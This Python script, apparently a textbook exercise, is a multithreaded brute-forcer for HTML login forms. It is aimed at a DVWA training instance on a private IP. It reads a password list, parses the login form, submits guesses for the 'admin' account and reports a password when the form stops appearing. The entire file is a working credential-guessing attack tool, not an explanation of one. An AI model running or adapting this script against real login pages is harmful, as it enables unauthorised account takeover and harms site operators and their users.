#ch5_html_form_brute_force.py
from  html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os

threads = 5
resume_word = None
username = "admin"
headers = {}
target_url = "http://192.168.108.143/dvwa/login.php"
post_url = "http://192.168.108.143/dvwa"
username_field = "username"
password_field = "password"


def build_passwd_q(passwd_file):
    fd = open(passwd_file, "rb")
    passwd_list = fd.readlines()
    fd.close()

    passwd_q = queue.Queue()

    if len(passwd_list):
        if not resume_word:
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                passwd_q.put(passwd)
        else:
            resume_found = False
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                if passwd == resume_word:
                    resume_found = True
                    passwd_q.put(passwd)
                else:
                    if resume_found:
                        passwd_q.put(passwd)
        return passwd_q


class BruteForcer():
    def __init__(self, username, passwd_q):
        self.username = username
        self.passwd_q = passwd_q
        self.found = False

    def html_brute_forcer(self):
        while not passwd_q.empty() and not self.found:
            # Enable cookies for the session
            cookiejar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))

            # This allows urlopen to use cookiejar
            urllib.request.install_opener(opener)

            request = urllib.request.Request(target_url, headers=headers)
            response = urllib.request.urlopen(request)

            # The response is in bytes. Convert to string and remove b''
            page = str(response.read())[2:-1]
            # Parse HTML Form
            parsed_html = BruteParser()
            parsed_html.feed(page)

            if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                parsed_html.parsed_results[username_field] = self.username
                parsed_html.parsed_results[password_field] = self.passwd_q.get()
                print(f"[*] Attempting {self.username}/{parsed_html.parsed_results[password_field]}")
                print(parsed_html.parsed_results[password_field])

                # Must be bytes
                post_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()

                brute_force_request = urllib.request.Request(post_url, headers=headers)
                print("\n" + str(brute_force_request))
                brute_force_response = urllib.request.urlopen(brute_force_request, data=post_data)

                # The response is in bytes. Convert to string and remove b''
                brute_force_page = str(brute_force_response.read())[2:-1]

                # Parse HTML Form
                brute_force_parsed_html = BruteParser()
                brute_force_parsed_html.feed(brute_force_page)

                if not brute_force_parsed_html.parsed_results:
                    self.found = True
                    print("[*] Brute-Force Attempt is Successful!")
                    print(f"[*] Username: {self.username}")
                    print(f"[*] Password: {parsed_html.parsed_results[password_field]}")
                    print("[*] Done")
                    return
            else:
                print("[!] HTML Page is Invalid")
                break

    # Brute-Forcing with multiple threads
    def html_brute_forcer_thread_starter(self):
        print(f"[*] Brute-Forcing with {threads} threads")
        for i in range(threads):
            html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)
            html_brute_forcer_thread.start()


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.parsed_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if name == "name" and value == username_field:
                    self.parsed_results[username_field] = username_field
                if name == "name" and value == password_field:
                    self.parsed_results[password_field] = password_field


print("[*] Started HTML Form Brute-Forcer Script")
print("[*] Building Password Queue")
passwd_q = build_passwd_q("passwd.txt")
if passwd_q.qsize():
    print("[*] Password Queue Build Successful")
    attempt_brute_force = BruteForcer("admin", passwd_q)
    attempt_brute_force.html_brute_forcer_thread_starter()
else:
    print("[!] Empty Password File!")
    sys.exit(0)
